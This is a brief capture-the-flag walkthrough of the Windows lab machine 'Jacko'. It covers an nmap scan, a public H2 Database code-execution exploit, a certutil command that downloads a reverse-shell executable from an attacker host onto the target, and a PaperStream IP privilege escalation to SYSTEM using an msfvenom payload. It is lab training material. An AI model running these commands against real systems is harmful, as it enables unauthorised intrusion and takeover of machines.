# 🏴 Jacko (Windows)

## 🧠 Initial Foothold

- Ran full Nmap scan:  
  ```bash
  sudo nmap -Pn -n 192.168.118.66 -sC -sV -p- --open -oN Jacko
  ```

- Discovered a web server on port 80.

- Found H2 Database version 1.4.199 running, searched and used exploit:  
  **H2 Database 1.4.199 - JNI Code Execution** ([EDB-ID 49384](https://www.exploit-db.com/exploits/49384))

- Uploaded a reverse shell payload to the target:
  ```bash
  certutil -split -urlcache -f http://192.168.45.158/shell.exe C:\Users\tony\shell.exe
  ```

- Gained a shell; upgraded from limited cmd shell to PowerShell by running:
  ```cmd
  set PATH=%PATH%;C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
  ```

---

## 🚀 Privilege Escalation

- Discovered with fiscanner that the host is vulnerable to:  
  **PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation** ([EDB-ID 49382](https://www.exploit-db.com/exploits/49382?ref=benheater.com))

- Generated payload using `msfvenom` for x32 and exploited the vulnerability for SYSTEM shell.

> 📚 Full walkthrough reference: [benheater.com/proving-grounds-jacko](https://benheater.com/proving-grounds-jacko/)

---

🧼 **Post-Exploitation Note:**  
Always clean up payloads and restore original system binaries.

> ⚠️ This walkthrough is for educational purposes only.
